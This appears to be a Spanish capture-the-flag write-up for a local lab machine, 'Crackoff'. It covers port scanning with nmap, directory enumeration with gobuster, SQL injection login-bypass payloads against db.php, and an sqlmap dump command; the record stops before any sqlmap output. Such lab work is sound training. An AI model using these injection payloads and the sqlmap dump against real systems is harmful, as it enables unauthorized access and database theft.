# Crackoff

Iniciamos con un ping a la máquina

```bash
 ping -c1 172.17.0.2 
```

```bash
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.068 ms

--- 172.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.068/0.068/0.068/0.000 ms
```

Escaneamos puertos

```bash
nmap -sC -sV -oN crackoff.nmap 172.17.0.2
```

```bash
Starting Nmap 7.97 ( https://nmap.org ) at 2025-07-23 13:59 -0500
Nmap scan report for 172.17.0.2
Host is up (0.000043s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3d:fc:bd:41:cb:81:e8:cd:a2:58:5a:78:68:2b:a3:04 (ECDSA)
|_  256 d8:5a:63:27:60:35:20:30:a9:ec:25:36:9e:50:06:8d (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: CrackOff - Bienvenido
|_http-server-header: Apache/2.4.58 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.91 seconds
```

Vemos que hay en el servidor Apache:

```
curl http://172.17.0.2
```

```html
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CrackOff - Bienvenido</title>
    <style>
        body {
            margin: 0;
            font-family: 'Courier New', Courier, monospace;
            color: #00ff00;
            background: black;
            overflow: hidden;
            text-align: center;
        }
        header {
            background-color: #003300;
            padding: 20px;
            color: #00ff00;
            font-size: 2.5em;
            border-bottom: 2px solid #00ff00;
            text-shadow: 0 0 10px #00ff00, 0 0 20px #00ff00;
        }
        .container {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 80vh;
            position: relative;
        }
        .title {
            font-size: 3em;
            margin: 20px;
            text-shadow: 0 0 10px #00ff00, 0 0 20px #00ff00;
        }
        .button {
            display: inline-block;
            padding: 15px 30px;
            margin: 10px;
            font-size: 1.5em;
            color: #000;
            background-color: #00ff00;
            border: 2px solid #00cc00;
            border-radius: 5px;
            text-decoration: none;
            transition: all 0.3s ease;
        }
        .button:hover {
            background-color: #00cc00;
            color: #fff;
            transform: scale(1.1);
        }
        .info-box {
            background: rgba(0, 0, 0, 0.7);
            padding: 20px;
            margin: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px #00ff00;
            max-width: 800px;
            text-align: left;
        }
        .info-box h3 {
            font-size: 1.8em;
        }
        footer {
            position: absolute;
            bottom: 0;
            width: 100%;
            background-color: #003300;
            color: #00ff00;
            padding: 10px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <header>
        CrackOff - Hacking Central
    </header>
    <div class="container">
        <div class="title">Bienvenido a CrackOff</div>
        <a href="login.php" class="button">Iniciar Sesión</a>
        <div class="info-box">
            <h3>Información del Sistema</h3>
            <p>Últimos registros:</p>
            <ul>
                <li>12/08/2024 - Sistema operativo actualizado.</li>
                <li>11/08/2024 - Se detectaron intentos de acceso no autorizados.</li>
                <li>10/08/2024 - Nueva vulnerabilidad de ************ reportada.</li>
            </ul>
            <p>Para más detalles, visite nuestro <a href="#" style="color: #00ff00;">panel de administración</a>.</p>
        </div>
    </div>
    <footer>
        &copy; 2024 CrackOff. Todos los derechos reservados.
    </footer>
</body>
</html>
```

Vemos que hay en login.php

```bash
curl http://172.17.0.2/login.php
```

```html
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CrackOff - Login</title>
    <style>
        body {
            margin: 0;
            font-family: 'Courier New', Courier, monospace;
            color: #00ff00;
            background: black;
            overflow: hidden;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            text-align: center;
            position: relative;
        }
        header {
            background-color: #003300;
            padding: 15px;
            color: #00ff00;
            font-size: 2em;
            border-bottom: 2px solid #00ff00;
            text-shadow: 0 0 10px #00ff00, 0 0 20px #00ff00;
            position: absolute;
            top: 0;
            width: 100%;
            left: 0;
            text-align: center;
            z-index: 1000;
        }
        .container {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 20px;
        }
        .login-form {
            background: rgba(0, 0, 0, 0.8);
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 15px #00ff00;
            width: 100%;
            max-width: 300px;
            text-align: center;
        }
        .login-form h2 {
            font-size: 1.8em;
            margin-bottom: 15px;
            color: #00ff00;
            text-shadow: 0 0 10px #00ff00, 0 0 20px #00ff00;
        }
        .login-form input {
            width: calc(100% - 20px);
            padding: 10px;
            margin: 10px 0;
            border: 2px solid #00ff00;
            border-radius: 5px;
            background: black;
            color: #00ff00;
            font-size: 1em;
            box-sizing: border-box;
        }
        .login-form input[type="submit"] {
            background-color: #00ff00;
            color: #000;
            cursor: pointer;
            font-size: 1.2em;
            border: none;
            transition: background-color 0.3s, transform 0.3s;
        }
        .login-form input[type="submit"]:hover {
            background-color: #00cc00;
            transform: scale(1.05);
        }
        .info-box {
            background: rgba(0, 0, 0, 0.7);
            padding: 15px;
            border-radius: 10px;
            box-shadow: 0 0 10px #00ff00;
            max-width: 280px;
            text-align: left;
            color: #00ff00;
        }
        .info-box h3 {
            font-size: 1.3em;
            margin-bottom: 10px;
        }
        .info-box p {
            font-size: 0.9em;
            margin: 5px 0;
        }
        footer {
            position: absolute;
            bottom: 0;
            width: 100%;
            background-color: #003300;
            color: #00ff00;
            padding: 5px;
            font-size: 0.8em;
            text-align: center;
        }
    </style>
</head>
<body>
    <header>
        CrackOff - Login
    </header>
    <div class="container">
        <div class="login-form">
            <h2>Acceso Seguro</h2>
            <form action="db.php" method="post">
                <input type="text" name="username" placeholder="Nombre de Usuario" required>
                <input type="password" name="password" placeholder="Contraseña" required>
                <input type="submit" value="Iniciar Sesión">
            </form>
        </div>
        <div class="info-box">
            <h3>¿Problemas para acceder?</h3>
            <p>Si tienes problemas para iniciar sesión, verifica que estés utilizando el nombre de usuario y la contraseña correctos.</p>
            <p>Si el problema persiste, contacta con el administrador del sistema.</p>
        </div>
    </div>
    <footer>
        &copy; 2024 CrackOff. Todos los derechos reservados.
    </footer>
</body>
</html>
```

Vemos si podemos loguear con algún contenido genérico, para ver la respuesta

```bash
curl -X POST -d "username=admin&password=admin" http://172.17.0.2/db.php
```

```bash
Consulta SQL: SELECT * FROM users WHERE username = 'admin' AND password = 'admin'<br>
```

Insertamos una consulta, ya que nos devolvió la estructura

```bash
curl -X POST -d "username=' OR '1'='1&password=123" http://172.17.0.2/db.php
```

```bash
Consulta SQL: SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '123'<br>
```

Quiero inyectar un loguin donde la consulta SQL no tenga en cuenta la password

```bash
curl -X POST -d "username=' OR '1'='1' -- -&password=irrelevante" http://172.17.0.2/db.php
```

```bash
Consulta SQL: SELECT * FROM users WHERE username = '' OR '1'='1' -- -' AND password = 'irrelevante'<br>
```

Quiero hacer un escaneo con globuster para lo que me descargo la common.txt

```bash
curl -o common.txt https://raw.githubusercontent.com/v0re/dirb/master/wordlists/common.txt
```

```bash
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 35849  100 35849    0     0   127k      0 --:--:-- --:--:-- --:--:--  127k
```

Usar el archivo descargado para buscar directorios

```bash
gobuster dir -u http://172.17.0.2 -w ./common.txt -x php,txt,html -o gobuster_crackoff.txt
```

```bash
===============================================================
Gobuster v3.7
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                ./common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.7
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta.php             (Status: 403) [Size: 275]
/.hta                 (Status: 403) [Size: 275]
/.hta.txt             (Status: 403) [Size: 275]
/.hta.html            (Status: 403) [Size: 275]
/.htaccess.txt        (Status: 403) [Size: 275]
/.htaccess            (Status: 403) [Size: 275]
/.htaccess.html       (Status: 403) [Size: 275]
/.htpasswd            (Status: 403) [Size: 275]
/.htaccess.php        (Status: 403) [Size: 275]
/.htpasswd.html       (Status: 403) [Size: 275]
/.htpasswd.txt        (Status: 403) [Size: 275]
/.htpasswd.php        (Status: 403) [Size: 275]
/db.php               (Status: 302) [Size: 75] [--> error.php]
/error.php            (Status: 200) [Size: 2705]
/index.php            (Status: 200) [Size: 2974]
/index.php            (Status: 200) [Size: 2974]
/login.php            (Status: 200) [Size: 3968]
/server-status        (Status: 403) [Size: 275]
/welcome.php          (Status: 200) [Size: 2800]
Progress: 18452 / 18452 (100.00%)
===============================================================
Finished
===============================================================
```

Vamos a welcome.php

```bash
curl http://172.17.0.2/welcome.php
```

```html
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CrackOff - Panel de Control</title>
    <style>
        body {
            margin: 0;
            font-family: 'Courier New', Courier, monospace;
            color: #00ff00;
            background: black;
            overflow: hidden;
            text-align: center;
        }
        header {
            background-color: #003300;
            padding: 20px;
            color: #00ff00;
            font-size: 2.5em;
            border-bottom: 2px solid #00ff00;
            text-shadow: 0 0 10px #00ff00, 0 0 20px #00ff00;
        }
        .container {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 80vh;
            position: relative;
        }
        .welcome-message {
            font-size: 2.5em;
            margin: 20px;
            text-shadow: 0 0 10px #00ff00, 0 0 20px #00ff00;
        }
        .panel {
            background: rgba(0, 0, 0, 0.7);
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 15px #00ff00;
            max-width: 800px;
            margin: auto;
            text-align: left;
        }
        .panel h3 {
            font-size: 1.8em;
        }
        .button {
            display: inline-block;
            padding: 15px 30px;
            margin: 10px;
            font-size: 1.5em;
            color: #000;
            background-color: #00ff00;
            border: 2px solid #00cc00;
            border-radius: 5px;
            text-decoration: none;
            transition: all 0.3s ease;
        }
        .button:hover {
            background-color: #00cc00;
            color: #fff;
            transform: scale(1.1);
        }
        footer {
            position: absolute;
            bottom: 0;
            width: 100%;
            background-color: #003300;
            color: #00ff00;
            padding: 10px;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <header>
        CrackOff - Panel de Control
    </header>
    <div class="container">
        <div class="welcome-message">¡Bienvenido, Admin!</div>
        <div class="panel">
            <h3>Panel de Control</h3>
            <p>Aquí puedes gestionar la base de datos y ver la información.</p>
            <p>Este panel te proporciona acceso a las funciones críticas del sistema. Usa herramientas como sqlmap para extraer datos y analizar la seguridad.</p>
            <a href="index.php" class="button">Volver al Inicio</a>
        </div>
    </div>
    <footer>
        &copy; 2024 CrackOff. Todos los derechos reservados.
    </footer>
</body>
</html>
```

Como puedo enviar consultas al db.php voy a hacer una extracción de esquemas con sqlmap

```bash
sqlmap -u "http://172.17.0.2/db.php" --data="username=admin&password=admin" --batch --dump
```

